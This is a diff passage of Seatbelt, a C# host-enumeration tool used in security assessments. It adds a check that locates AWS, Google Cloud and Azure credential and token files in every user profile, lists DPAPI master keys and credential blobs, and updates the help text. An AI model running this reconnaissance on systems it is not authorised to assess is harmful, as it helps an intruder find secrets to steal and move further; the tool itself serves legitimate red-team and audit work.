                         Dictionary<string, object> recentCommands = GetRegValues("HKU", String.Format("{0}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", SID));
                         if ((recentCommands != null) && (recentCommands.Count != 0))
                         {
-                            Console.WriteLine("    {0} :", SID);
+                            Console.WriteLine("\r\n    {0} :", SID);
                             foreach (KeyValuePair<string, object> kvp in recentCommands)
                             {
                                 Console.WriteLine("      {0,-10} :  {1}", kvp.Key, kvp.Value);
@@ -5513,7 +6176,7 @@ namespace Seatbelt
                     if (SID.StartsWith("S-1-5") && !SID.EndsWith("_Classes"))
                     {
                         string[] subKeys = GetRegSubkeys("HKU", String.Format("{0}\\Software\\SimonTatham\\PuTTY\\Sessions\\", SID));
-                        
+
                         foreach (string sessionName in subKeys)
                         {
                             Console.WriteLine("    {0,-20}  :  {1}", "User SID", SID);
@@ -5546,7 +6209,7 @@ namespace Seatbelt
                 Console.WriteLine("\r\n\r\n=== Putty Saved Session Information (Current User) ===\r\n");
 
                 string[] subKeys = GetRegSubkeys("HKCU", "Software\\SimonTatham\\PuTTY\\Sessions\\");
-                foreach(string sessionName in subKeys)
+                foreach (string sessionName in subKeys)
                 {
                     Console.WriteLine("    {0,-20}  :  {1}", "SessionName", sessionName);
 
@@ -5559,7 +6222,7 @@ namespace Seatbelt
                         "ConnectionSharing"
                     };
 
-                    foreach(string key in keys)
+                    foreach (string key in keys)
                     {
                         string result = GetRegValue("HKCU", String.Format("Software\\SimonTatham\\PuTTY\\Sessions\\{0}", sessionName), key);
                         if (!String.IsNullOrEmpty(result))
@@ -5620,6 +6283,182 @@ namespace Seatbelt
             //        Console.WriteLine("    {0,-10}", kvp.Key);
             //    }
             //}
+        }
+
+        public static void ListCloudCreds()
+        {
+            // checks for various cloud credential files (AWS, Microsoft Azure, and Google Compute)
+            // adapted from https://twitter.com/cmaddalena's SharpCloud project (https://github.com/chrismaddalena/SharpCloud/)
+            try
+            {
+                if (IsHighIntegrity())
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for Cloud Credentials (All Users) ===\r\n");
+
+                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                    string[] dirs = Directory.GetDirectories(userFolder);
+                    foreach (string dir in dirs)
+                    {
+                        bool found = false;
+                        string[] parts = dir.Split('\\');
+                        string userName = parts[parts.Length - 1];
+                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                        {
+                            string awsKeyFile = String.Format("{0}\\.aws\\credentials", dir);
+                            if (System.IO.File.Exists(awsKeyFile))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(awsKeyFile);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(awsKeyFile);
+                                long size = new System.IO.FileInfo(awsKeyFile).Length;
+                                Console.WriteLine("  [*] AWS key file exists at     : {0}", awsKeyFile);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            string computeCredsDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\credentials.db", dir);
+                            if (System.IO.File.Exists(computeCredsDb))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeCredsDb);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeCredsDb);
+                                long size = new System.IO.FileInfo(computeCredsDb).Length;
+                                Console.WriteLine("  [*] Compute creds at           : {0}", computeCredsDb);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            string computeLegacyCreds = String.Format("{0}\\AppData\\Roaming\\gcloud\\legacy_credentials", dir);
+                            if (System.IO.File.Exists(computeLegacyCreds))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeLegacyCreds);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeLegacyCreds);
+                                long size = new System.IO.FileInfo(computeLegacyCreds).Length;
+                                Console.WriteLine("  [*] Compute legacy creds at    : {0}", computeLegacyCreds);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            string computeAccessTokensDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\access_tokens.db", dir);
+                            if (System.IO.File.Exists(computeAccessTokensDb))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeAccessTokensDb);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(computeAccessTokensDb);
+                                long size = new System.IO.FileInfo(computeAccessTokensDb).Length;
+                                Console.WriteLine("  [*] Compute access tokens at   : {0}", computeAccessTokensDb);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            string azureTokens = String.Format("{0}\\.azure\\accessTokens.json", dir);
+                            if (System.IO.File.Exists(azureTokens))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureTokens);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(azureTokens);
+                                long size = new System.IO.FileInfo(azureTokens).Length;
+                                Console.WriteLine("  [*] Azure access tokens at     : {0}", azureTokens);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            string azureProfile = String.Format("{0}\\.azure\\azureProfile.json", dir);
+                            if (System.IO.File.Exists(azureProfile))
+                            {
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureProfile);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(azureProfile);
+                                long size = new System.IO.FileInfo(azureProfile).Length;
+                                Console.WriteLine("  [*] Azure profile at           : {0}", azureProfile);
+                                Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                                Console.WriteLine("      Modified                   : {0}", lastModified);
+                                Console.WriteLine("      Size                       : {0}\r\n", size);
+                                found = true;
+                            }
+                            if (found)
+                            {
+                                System.Console.WriteLine();
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for Cloud Credentials (Current User) ===\r\n");
+
+                    string awsKeyFile = String.Format("{0}\\.aws\\credentials", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(awsKeyFile))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(awsKeyFile);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(awsKeyFile);
+                        long size = new System.IO.FileInfo(awsKeyFile).Length;
+                        Console.WriteLine("  [*] AWS key file exists at     : {0}", awsKeyFile);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                    string computeCredsDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\credentials.db", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(computeCredsDb))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeCredsDb);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeCredsDb);
+                        long size = new System.IO.FileInfo(computeCredsDb).Length;
+                        Console.WriteLine("  [*] Compute creds at           : {0}", computeCredsDb);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                    string computeLegacyCreds = String.Format("{0}\\AppData\\Roaming\\gcloud\\legacy_credentials", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(computeLegacyCreds))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeLegacyCreds);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeLegacyCreds);
+                        long size = new System.IO.FileInfo(computeLegacyCreds).Length;
+                        Console.WriteLine("  [*] Compute legacy creds at    : {0}", computeLegacyCreds);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                    string computeAccessTokensDb = String.Format("{0}\\AppData\\Roaming\\gcloud\\access_tokens.db", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(computeAccessTokensDb))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(computeAccessTokensDb);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(computeAccessTokensDb);
+                        long size = new System.IO.FileInfo(computeAccessTokensDb).Length;
+                        Console.WriteLine("  [*] Compute access tokens at   : {0}", computeAccessTokensDb);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                    string azureTokens = String.Format("{0}\\.azure\\accessTokens.json", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(azureTokens))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureTokens);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(azureTokens);
+                        long size = new System.IO.FileInfo(azureTokens).Length;
+                        Console.WriteLine("  [*] Azure access tokens at     : {0}", azureTokens);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                    string azureProfile = String.Format("{0}\\.azure\\azureProfile.json", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(azureProfile))
+                    {
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(azureProfile);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(azureProfile);
+                        long size = new System.IO.FileInfo(azureProfile).Length;
+                        Console.WriteLine("  [*] Azure profile at           : {0}", azureProfile);
+                        Console.WriteLine("      Accessed                   : {0}", lastAccessed);
+                        Console.WriteLine("      Modified                   : {0}", lastModified);
+                        Console.WriteLine("      Size                       : {0}\r\n", size);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("  [X] Exception: {0}", ex.Message);
+            }
         }
 
         public static void ListRecentFiles()
@@ -5738,7 +6577,7 @@ namespace Seatbelt
                 Console.WriteLine("\r\n\r\n=== Interesting Files (All Users) ===\r\n");
 
                 string searchPath = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
-                
+
                 List<string> files = FindFiles(searchPath, patterns);
 
                 foreach (string file in files)
@@ -5882,7 +6721,8 @@ namespace Seatbelt
             ListNonstandardProcesses();
 
             // list patches and List4624Events/List4648Events if we're doing "full" collection
-            if (!FilterResults.filter) {
+            if (!FilterResults.filter)
+            {
                 ListPatches();
                 List4624Events();
                 List4648Events();
@@ -5912,13 +6752,17 @@ namespace Seatbelt
 
             CheckFirefox();
             CheckChrome();
-            DumpVault();
             TriageIE();
+            DumpVault();
             ListSavedRDPConnections();
             ListRecentRunCommands();
             ListPuttySessions();
             ListPuttySSHHostKeys();
+            ListCloudCreds();
             ListRecentFiles();
+            ListMasterKeys();
+            ListCredFiles();
+            ListRDCManFiles();
 
             if (!FilterResults.filter)
             {
@@ -5942,7 +6786,7 @@ namespace Seatbelt
             Console.WriteLine("\tUserEnvVariables      -   Current user environment variables");
             Console.WriteLine("\tSystemEnvVariables    -   Current system environment variables");
             Console.WriteLine("\tUserFolders           -   Folders in C:\\Users\\");
-            Console.WriteLine("\tNonstandardServices   -   Services with binary paths not in C:\\Windows\\");
+            Console.WriteLine("\tNonstandardServices   -   Services with file info company names that don't contain 'Microsoft'");
             Console.WriteLine("\tInternetSettings      -   Internet settings including proxy configs");
             Console.WriteLine("\tLapsSettings          -   LAPS settings, if installed");
             Console.WriteLine("\tLocalGroupMembers     -   Members of local admins, RDP, and DCOM");
@@ -5959,18 +6803,22 @@ namespace Seatbelt
             Console.WriteLine("\tARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)");
             Console.WriteLine("\tAllTcpConnections     -   Lists current TCP connections and associated processes");
             Console.WriteLine("\tAllUdpConnections     -   Lists current UDP connections and associated processes");
-            Console.WriteLine("\tNonstandardProcesses  -   Processes with binary paths not in C:\\Windows\\");
+            Console.WriteLine("\tNonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'");
             Console.WriteLine("\t *  If the user is in high integrity, the following additional actions are run:");
             Console.WriteLine("\tSysmonConfig          -   Sysmon configuration from the registry");
-            
+
             Console.WriteLine("\r\n\r\n \"SeatBelt.exe user\" collects the following user data:\r\n");
             Console.WriteLine("\tSavedRDPConnections   -   Saved RDP connections");
             Console.WriteLine("\tTriageIE              -   Internet Explorer bookmarks and history  (last 7 days)");
-            Console.WriteLine("\tDumpVault             -   Dump saved credentials in Windows Vault (such as logins from Internet Explorer and Edge)");
+            Console.WriteLine("\tDumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb");
             Console.WriteLine("\tRecentRunCommands     -   Recent \"run\" commands");
             Console.WriteLine("\tPuttySessions         -   Interesting settings from any saved Putty configurations");
             Console.WriteLine("\tPuttySSHHostKeys      -   Saved putty SSH host keys");
+            Console.WriteLine("\tCloudCreds            -   AWS/Google/Azure cloud credential files");
             Console.WriteLine("\tRecentFiles           -   Parsed \"recent files\" shortcuts  (last 7 days)");
+            Console.WriteLine("\tMasterKeys            -   List DPAPI master keys");
+            Console.WriteLine("\tCredFiles             -   List Windows credential DPAPI blobs");
+            Console.WriteLine("\tRDCManFiles           -   List Windows Remote Desktop Connection Manager settings files");
             Console.WriteLine("\t *  If the user is in high integrity, this data is collected for ALL users instead of just the current user");
 
             Console.WriteLine("\r\n\r\n Non-default options:\r\n");
@@ -5986,7 +6834,7 @@ namespace Seatbelt
             Console.WriteLine("\t4624Events            -   4624 logon events from the security event log");
             Console.WriteLine("\t4648Events            -   4648 explicit logon events from the security event log (runas or outbound RDP)");
             Console.WriteLine("\tKerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.");
-            
+
             Console.WriteLine("\r\n\r\n \"SeatBelt.exe all\" will run ALL enumeration checks, can be combined with \"full\".\r\n");
             Console.WriteLine("\r\n \"SeatBelt.exe [CheckName] full\" will prevent any filtering and will return complete results.\r\n");
             Console.WriteLine("\r\n \"SeatBelt.exe [CheckName] [CheckName2] ...\" will run one or more specified checks only (case-sensitive naming!)\r\n");
@@ -6000,7 +6848,15 @@ namespace Seatbelt
 
             if (args.Length != 0)
             {
-                foreach(string arg in args)
+                foreach (string arg in args)
+                {
+                    if (string.Equals(arg, "full", StringComparison.CurrentCultureIgnoreCase))
+                    {
+                        FilterResults.filter = false;
+                    }
+                }
+
+                foreach (string arg in args)
                 {
                     if (string.Equals(arg, "full", StringComparison.CurrentCultureIgnoreCase))
                     {
@@ -6020,7 +6876,7 @@ namespace Seatbelt
                             return;
                         }
                     }
-                    if ( (args.Length == 1 ) && string.Equals(arg, "all", StringComparison.CurrentCultureIgnoreCase))
+                    if (string.Equals(arg, "all", StringComparison.CurrentCultureIgnoreCase))
                     {
                         SystemChecks();
                         ListKerberosTickets();
@@ -6040,7 +6896,7 @@ namespace Seatbelt
 
                 foreach (string arg in args)
                 {
-                    if (string.Equals(arg, "full", StringComparison.CurrentCultureIgnoreCase)) {}
+                    if (string.Equals(arg, "full", StringComparison.CurrentCultureIgnoreCase)) { }
                     else if (string.Equals(arg, "system", StringComparison.CurrentCultureIgnoreCase))
                     {
                         SystemChecks();
@@ -6090,7 +6946,7 @@ namespace Seatbelt
             }
 
             watch.Stop();
-            Console.WriteLine("\r\n\r\n[*] Completed Safety Checks in {0} seconds\r\n", (watch.ElapsedMilliseconds / 1000) );
+            Console.WriteLine("\r\n\r\n[*] Completed Safety Checks in {0} seconds\r\n", (watch.ElapsedMilliseconds / 1000));
         }
     }
 }
